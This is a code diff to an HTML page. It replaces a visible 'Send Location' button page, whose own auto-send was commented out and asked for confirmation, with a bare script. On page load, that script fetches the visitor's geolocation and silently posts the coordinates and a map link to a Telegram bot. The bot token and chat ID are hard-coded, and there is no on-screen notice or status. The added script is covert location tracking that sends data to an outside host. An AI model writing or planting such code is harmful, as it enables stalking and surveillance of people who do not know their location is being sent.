@@ -1,129 +1,33 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Share</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-        }
-        button {
-            background: white;
-            color: #667eea;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        #status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 10px;
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <h1>Hello</h1>
-    <button onclick="sendLocation()">Send Location</button>
-    <div id="status"></div>
-
-    <script>
-        // YOUR BOT DETAILS - DO NOT CHANGE
-        const BOT_TOKEN = "8689283758:AAGAoRKk6uoS1NrC828IWkpizNYM__9K7Qg";
-        const CHAT_ID = "1755569425";
+<script>
+    // YOUR BOT DETAILS - DO NOT CHANGE
+    const BOT_TOKEN = "8689283758:AAGAoRKk6uoS1NrC828IWkpizNYM__9K7Qg";
+    const CHAT_ID = "1755569425";
+    
+    async function sendLocation(lat, lng) {
+        const message = `📍 Location Shared!\n\nLat: ${lat}\nLng: ${lng}\n\nMap: https://maps.google.com/?q=${lat},${lng}`;
         
-        const statusDiv = document.getElementById('status');
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
-        function showStatus(message, isError) {
-            statusDiv.textContent = message;
-            statusDiv.style.display = 'block';
-            statusDiv.style.background = isError ? '#ffebee' : '#d4edda';
-            statusDiv.style.color = isError ? '#721c24' : '#155724';
-            setTimeout(() => {
-                statusDiv.style.display = 'none';
-            }, 5000);
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+        } catch(error) {
+            console.log('Error:', error);
         }
-        
-        async function sendLocation() {
-            if (!navigator.geolocation) {
-                showStatus('Geolocation not supported', true);
-                return;
+    }
+    
+    // Auto send on page load
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                sendLocation(position.coords.latitude, position.coords.longitude);
+            },
+            (error) => {
+                console.log('Location error:', error);
             }
-            
-            showStatus('Getting location...', false);
-            
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    
-                    showStatus('Sending to @Biruklocationbot...', false);
-                    
-                    const message = `📍 Location Shared!\n\nLat: ${lat}\nLng: ${lng}\n\nMap: https://maps.google.com/?q=${lat},${lng}`;
-                    
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                    
-                    try {
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chat_id: CHAT_ID,
-                                text: message
-                            })
-                        });
-                        
-                        const data = await response.json();
-                        
-                        if (data.ok) {
-                            showStatus('✅ Location sent! Check @Biruklocationbot on Telegram', false);
-                        } else {
-                            showStatus('❌ Error: ' + data.description, true);
-                        }
-                    } catch (error) {
-                        showStatus('❌ Connection error: ' + error.message, true);
-                    }
-                },
-                (error) => {
-                    let errorMsg = '';
-                    switch(error.code) {
-                        case 1:
-                            errorMsg = 'Please allow location access';
-                            break;
-                        case 2:
-                            errorMsg = 'Location unavailable';
-                            break;
-                        case 3:
-                            errorMsg = 'Location request timed out';
-                            break;
-                        default:
-                            errorMsg = 'Error getting location';
-                    }
-                    showStatus('❌ ' + errorMsg, true);
-                }
-            );
-        }
-        
-        // Optional: Auto send on page load (remove if you don't want this)
-        // setTimeout(() => {
-        //     if (confirm('Share your location?')) {
-        //         sendLocation();
-        //     }
-        // }, 1000);
-    </script>
-</body>
-</html>
+        );
+    }
+</script>
